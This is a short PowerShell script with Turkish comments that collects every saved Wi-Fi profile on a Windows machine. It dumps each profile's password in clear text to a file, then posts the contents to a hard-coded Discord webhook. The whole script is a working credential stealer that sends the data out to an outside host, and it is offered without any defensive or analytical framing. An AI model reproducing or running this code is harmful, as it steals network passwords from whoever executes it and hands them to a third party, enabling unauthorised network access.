# Profil isimlerini al
$profiles = netsh wlan show profiles | Where-Object { $_ -match 'All User Profile' } | ForEach-Object {
    ($_ -split ':')[1].Trim()
}

$outputFile = "$env:USERPROFILE\wifipass.txt"
Remove-Item $outputFile -ErrorAction SilentlyContinue

# Her profilin detayını yaz
foreach ($profile in $profiles) {
    netsh wlan show profile name="$profile" key=clear | Out-File -Append $outputFile
}

# Discord webhook URL'si
$webhookUrl = 'https://discord.com/api/webhooks/1397314423084810250/BKCu31_MoFQOrfWi6ZGFGa7CXbGAcnIqeRfZXDXL7IG2Y0kRN6lYT_fxibN-8fIcBfTN'

# Dosya içeriğini oku ve escape et
$fileContent = Get-Content $outputFile -Raw
$escapedContent = $fileContent -replace '"','\"'

# JSON payload'u oluştur
$payload = '{ "content": "```' + $escapedContent + '```" }'

# Discord'a POST et
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
